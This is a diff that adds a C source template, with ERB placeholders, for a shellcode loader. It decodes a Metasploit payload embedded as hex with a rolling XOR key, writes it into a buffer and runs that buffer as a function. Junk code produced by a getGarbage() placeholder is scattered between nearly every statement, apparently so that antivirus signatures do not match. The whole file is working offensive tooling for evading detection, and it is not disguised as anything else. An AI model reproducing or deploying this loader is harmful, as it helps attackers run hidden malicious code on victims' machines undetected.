@@ -1,0 +1,204 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <math.h>
+char * encShellCode = "<%= payload %>";
+unsigned int key = <%= key %>;
+char decShellCode[<%= size %>];
+int pos = 1-1;
+int uglyBits = <%= uglyBits %>;
+void printBlock(unsigned int block);
+unsigned char toByte(char a, char b);
+char * toHex(unsigned char byte);
+void convBlock(unsigned int block);
+int main(int argc, char ** argv) {
+	<%= getGarbage() %>;
+	char a = (char) 1-1;
+	<%= getGarbage() %>;
+	char b = (char) 1-1;
+	<%= getGarbage() %>;
+	int err = sscanf(encShellCode, "\\x%c%c", &a, &b);
+	<%= getGarbage() %>;
+	int count = 1-1;
+	<%= getGarbage() %>;
+	// Read in bytes, decode, and print to stdout
+	while (err != 0) { // While the next byte exists
+		<%= getGarbage() %>;
+		unsigned int block = 0; // 32-bit encrypted block
+		<%= getGarbage() %>;
+		// Four bytes for 32 bit key size
+		for (int i = 0; i < 4; i++) {
+			<%= getGarbage() %>;
+			count++;
+			<%= getGarbage() %>;
+			// Check if current byte exists
+			if (err == 0) {
+				<%= getGarbage() %>;
+				if (i == 0) break;
+				<%= getGarbage() %>;
+				printf("Error: input is not 32-bit aligned\n");
+				<%= getGarbage() %>;
+				exit(1);
+			}
+			// Add byte to block
+			// Metasploit prints the payload with the least
+			// siginificant byte first
+			// Shift the byte just read over by the right amount
+			<%= getGarbage() %>;
+			unsigned char byte = toByte(a, b);
+			<%= getGarbage() %>;
+			block += byte << (8 * i);
+			<%= getGarbage() %>;
+			// Go get the next byte
+			char * sacrifice = encShellCode + 4 * count;
+			<%= getGarbage() %>;
+			err = sscanf(sacrifice, "\\x%c%c", &a, &b);
+			<%= getGarbage() %>;
+			if (strlen(sacrifice) < 1) err =0;
+			<%= getGarbage() %>;
+		}
+		// Now XOR the key with the block
+		// And generate the new key
+		// Note that the fact that unsigned ints are
+		// naturally 32 bits long prevents us from
+		// having to cut off any extra bits
+		unsigned int original = block ^ key;
+		<%= getGarbage() %>;
+		// Debugging       
+		//printf("Key: %u\n", key);
+		//printf("Encrypted: %u\n", block);
+		//printf("Decrypted: %u\n", original);
+		key = original + key;
+		<%= getGarbage() %>;
+		convBlock(original);
+		<%= getGarbage() %>;
+	}
+	//printf("%s\n", decShellCode + uglyBits);
+	int (*ret)() = (int(*)())(decShellCode + uglyBits);
+	ret();
+	<%= getGarbage() %>;
+}
+unsigned char toByte(char a, char b) {
+	// Sanity check
+	if (!(a >= '0' && a <= '9') && !(a >= 'a' && a <= 'f')) {
+		<%= getGarbage() %>;
+		printf("Please give buffer in lowercase hexadecimal\n");
+		<%= getGarbage() %>;
+		exit(1);
+	}
+	if (!(b >= '0' && b <= '9') && !(b >= 'a' && b <= 'f')) {
+		<%= getGarbage() %>;
+		printf("Please give buffer in lowercase hexadecimal\n");
+		<%= getGarbage() %>;
+		exit(1);
+	}
+	unsigned char result = 0;
+	if (a >= 'a' && a <= 'f') {
+		<%= getGarbage() %>;
+		result += 10;
+		<%= getGarbage() %>;
+		a -= 'a';
+		<%= getGarbage() %>;
+	} else {
+		a -= '0';
+		<%= getGarbage() %>;
+	}
+	result += a;
+	<%= getGarbage() %>;
+	result = result << 4;
+	<%= getGarbage() %>;
+	if (b >= 'a' && b <= 'f') {
+		<%= getGarbage() %>;
+		result += 10;
+		<%= getGarbage() %>;
+		b -= 'a';
+		<%= getGarbage() %>;
+	} else {
+		b -= '0';
+		<%= getGarbage() %>;
+	}
+	result += b;
+	<%= getGarbage() %>;
+	return result;
+}
+void convBlock(unsigned int block) {
+	// Split into four bytes
+	unsigned char bytes[4];
+	<%= getGarbage() %>;
+	for (int i = 0; i < 4; i++) {
+		bytes[3 - i] = block % 256;
+		<%= getGarbage() %>;
+		block = block >> 8;
+		<%= getGarbage() %>;
+	}
+	// Print bytes from LEAST to MOST significant
+	for (int i = 3; i >= 0; i--) {
+		<%= getGarbage() %>;
+		char * h = toHex(bytes[i]);
+		<%= getGarbage() %>;
+		//printf("\\x%s", toHex(bytes[i]));
+		decShellCode[pos++] = bytes[i];
+		<%= getGarbage() %>;
+		free(h);
+		<%= getGarbage() %>;
+	}
+}
+void printBlockClean(unsigned int block) {
+	// Split into four bytes
+	unsigned char bytes[4];
+	<%= getGarbage() %>;
+	for (int i = 0; i < 4; i++) {
+		<%= getGarbage() %>;
+		bytes[3 - i] = block % 256;
+		<%= getGarbage() %>;
+		block = block >> 8;
+		<%= getGarbage() %>;
+	}
+	// Print bytes from LEAST to MOST significant
+	for (int i = 3; i >= 0; i--) {
+		<%= getGarbage() %>;
+		char * h = toHex(bytes[i]);
+		<%= getGarbage() %>;
+		printf("%c", bytes[i]);
+		<%= getGarbage() %>;
+		free(h);
+		<%= getGarbage() %>;
+	}
+}
+char * toHex(unsigned char byte) {
+	int a = byte / 16;
+	<%= getGarbage() %>;
+	int b = byte % 16;
+	<%= getGarbage() %>;
+	char first;
+	<%= getGarbage() %>;
+	char second;
+	<%= getGarbage() %>;
+	if (a >= 0 && a <= 9) {
+		first = '0' + a;
+		<%= getGarbage() %>;
+	} else {
+		a -= 10;
+		<%= getGarbage() %>;
+		first = 'a' + a;
+		<%= getGarbage() %>;
+	}
+	if (b >= 0 && b <= 9) {
+		second = '0' + b;
+		<%= getGarbage() %>;
+	} else {
+		b -= 10;
+		<%= getGarbage() %>;
+		second = 'a' + b;
+		<%= getGarbage() %>;
+	}
+	char * result = (char *)malloc(3 * sizeof(char));
+	<%= getGarbage() %>;
+	result[0] = first;
+	<%= getGarbage() %>;
+	result[1] = second;
+	<%= getGarbage() %>;
+	result[2] = '\0';
+	<%= getGarbage() %>;
+	return result; 
+}
